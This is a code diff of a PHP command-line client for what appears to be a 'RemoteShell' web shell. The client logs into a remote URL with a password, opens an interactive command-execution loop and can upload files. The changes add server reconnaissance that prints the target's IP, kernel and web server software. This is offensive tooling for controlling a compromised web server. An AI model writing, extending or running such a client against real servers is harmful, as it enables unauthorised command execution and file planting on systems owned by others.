@@ -11,11 +11,16 @@ $input = fgets($inputs);
     $password = trim(md5($input));
     $connect = remoteshell_connect($url,$password,"","test"); 
     if($connect == "suc_1"){
+            $os = remoteshell_connect($url,$password,"","checkos");
+            $server_info = json_decode(remoteshell_connect($url,$password,"","server_info"));
             print "[*] Connecting to ".$url."\n";
             print "[*] Success connect\n";
-            print "============[  Type  ]============\n";
+            print "[*] Server IP: ".$server_info->ip_address."\n";
+            print "[*] Kernel: ".$server_info->uname."\n";
+            print "[*] Web Server: ".$server_info->software."\n";
+            print "------------------------[  Type  ]------------------------\n";
             print "[1] Commands Shell mode\n";
-            print "[2] Upload file \n";
+            print "[2] Upload file\n";
             print "Type: ";
             $inputs = fopen("php://stdin","r");
             $input = fgets($inputs);
@@ -24,7 +29,7 @@ $input = fgets($inputs);
                 $type = "shell";
                 $name = "commands";
                 while(1){
-                    print "\33[1;31mRemoteShell@$name > \33[1;37m";
+                    print "\33[1;31mRemoteShell@$os > \33[1;37m";
                     $inputs = fopen("php://stdin","r");
                     $input = fgets($inputs);
                     $cmd = $input;
@@ -33,7 +38,6 @@ $input = fgets($inputs);
                         print $connect;
                     }
                     fclose($inputs);
-                    
                 }
             }
             if($type == "2"){
@@ -57,7 +61,6 @@ $input = fgets($inputs);
     }else{
         print "[*] Failed to connect, incorrect password\n";
     }
-fclose($inputs);
 
 function remoteshell_connect($url, $password, $cmd, $type, $file = "", $body = "") {
     $content = array("password"=>$password, "cmd"=>$cmd, "type"=>$type, "file"=>$file, "file_body"=>$body);
